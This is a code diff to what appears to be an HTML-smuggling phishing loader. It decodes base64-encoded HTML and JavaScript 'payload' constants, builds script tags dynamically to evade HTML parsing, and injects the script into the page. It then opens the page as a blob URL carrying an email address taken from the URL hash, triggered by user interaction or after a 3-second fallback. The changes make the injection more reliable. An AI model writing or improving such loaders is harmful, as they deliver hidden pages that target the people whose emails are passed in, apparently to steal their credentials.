@@ -37,8 +37,10 @@
             const htmlContent = decodeDoubleEncoded(HTML_CONTENT_B64);
             let jsContent = decodeDoubleEncoded(JS_CONTENT_B64);
 
+            // VISUAL FEEDBACK: If decoding fails, show an error instead of staying on "Loading..."
             if (!htmlContent || !jsContent) {
                 console.error("Failed to decode payload.");
+                document.body.innerHTML = "<h2 style='color:red; text-align:center; margin-top:50px;'>Decoding failed. Check console.</h2>";
                 return;
             }
 
@@ -46,25 +48,30 @@
             const emailFromHash = hash && hash.length > 1 ? decodeURIComponent(hash.slice(1)) : null;
 
             try {
-                // Hide tags from the HTML parser by building them dynamically
-                const closeTag = '<' + '/script>';
+                // Build tags dynamically to hide them from the HTML parser
                 const openTag = '<' + 'script>';
+                const closeTag = '<' + '/script>';
                 
-                // Escape any closing tags in the payload
-                jsContent = jsContent.split(closeTag).join('<\\/' + 'script>');
+                // Escape closing tags in the payload to prevent breaking the HTML
+                const safeJs = jsContent.split(closeTag).join('<\\/' + 'script>');
                 
-                // Inject the payload before </head>
-                const headClose = '<' + '/head>';
-                const injection = openTag + jsContent + closeTag;
-                const cleanHtml = htmlContent.split(headClose).join(injection + headClose);
+                // GUARANTEED INJECTION: Inject before </body> if it exists, otherwise append to the end
+                let cleanHtml;
+                const bodyClose = '<' + '/body>';
+                if (htmlContent.includes(bodyClose)) {
+                    cleanHtml = htmlContent.split(bodyClose).join(openTag + safeJs + closeTag + bodyClose);
+                } else {
+                    cleanHtml = htmlContent + openTag + safeJs + closeTag;
+                }
 
                 const blob = new Blob([cleanHtml], { type: 'text/html' });
                 const blobUrl = URL.createObjectURL(blob);
-                const finalUrl = emailFromHash ? `${blobUrl}#${emailFromHash}` : blobUrl;
+                const finalUrl = emailFromHash ? blobUrl + '#' + emailFromHash : blobUrl;
+                
                 window.location.replace(finalUrl);
             } catch (err) {
                 console.error("Blob creation failed:", err);
-                document.body.innerHTML = "<h2>Error loading content.</h2>";
+                document.body.innerHTML = "<h2 style='color:red; text-align:center; margin-top:50px;'>Error loading content.</h2>";
             }
         }
 
@@ -78,6 +85,8 @@
             document.addEventListener('mousemove', triggerOnInteract, { once: true });
             document.addEventListener('keydown', triggerOnInteract, { once: true });
             document.addEventListener('touchstart', triggerOnInteract, { once: true });
+            
+            // Fallback: proceed after 3 seconds regardless
             setTimeout(execute, 3000);
         }
     })();
